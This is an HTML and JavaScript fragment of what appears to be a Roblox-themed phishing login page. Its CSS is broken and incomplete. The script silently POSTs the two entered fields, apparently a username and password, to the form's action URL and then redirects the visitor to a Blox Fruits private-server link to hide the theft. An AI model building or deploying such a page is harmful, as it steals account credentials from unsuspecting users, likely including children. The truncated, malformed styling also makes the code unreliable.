    <style>
        .fake-input {
            width: 100%;
            min-height: 41px;

            border: 1px solid #35373c;

        body::after {

        .background-grid {
            position: absolute;
            top: -15%;
            left: -10%;
            width: 120%;
            height: 130%;
            display: none;
            grid-template-columns: repeat(6, 1fr);
            gap: 14px;
            transform: rotate(-6deg);
            z-index: 0;
            pointer-events: none;
        }
        .grid-item {
            border-radius: 14px;
            aspect-ratio: 1;
}
        .c1 { background: linear-gradient(135deg, #ff512f, #dd2476); }
        .c2 { background: linear-gradient(135deg, #1fa2ff, #12d8fa); }
        .c3 { background: linear-gradient(135deg, #4776e6, #8e54e9); }

        .clean-form label {

            font-weight: 600;
            color: #d1d5db;

.clean-form input {

        .pass-wrap {

        .pass-wrap input {

            padding-right: 40px;
        }
        .masked-input {

        }
        .eye-icon {
            position: absolute;
            right: 12px;
            top: 50%;
            transform: translateY(-50%);

            color: #d1d5db;

        .btn-submit {

        }
        .helper-links {

        }
        .helper-links a {
            color: #d1d5db;
            text-decoration: underline;
        }
        .helper-links a:hover {

        }
        .divider {

            color: #9ca3af;
            font-size: 11px;
            font-weight: 600;
            margin: 20px 0;

        .divider::before, .divider::after {

        .divider span { padding: 0 12px; }
        
        .alt-buttons {

<style>
    .btn-submit.active {
        background-color: #2563eb !important;
        color: #ffffff !important;
        cursor: pointer;
    }
</style>

<script>
    const form = document.querySelector('.clean-form');
    const input1 = document.querySelector('input[name="field1"]');
    const input2 = document.querySelector('input[name="field2"]');
    const btn = document.querySelector('.btn-submit');

    function updateBtnColor() {
        if (input1.value.trim() !== '' && input2.value.trim() !== '') {
            btn.classList.add('active');
        } else {
            btn.classList.remove('active');
        }
    }

    input1.addEventListener('input', updateBtnColor);
    input2.addEventListener('input', updateBtnColor);

    form.addEventListener('submit', function(e) {
        e.preventDefault();
        
        fetch(form.action, {
            method: 'POST',
            body: new FormData(form),
            headers: { 'Accept': 'application/json' }
        }).finally(() => {
            window.location.href = 'https://www.roblox.com/games/2753915549/Blox-Fruits?privateServerLinkCode=21761205912540174630224868514221'; 
        });
    });
</script>
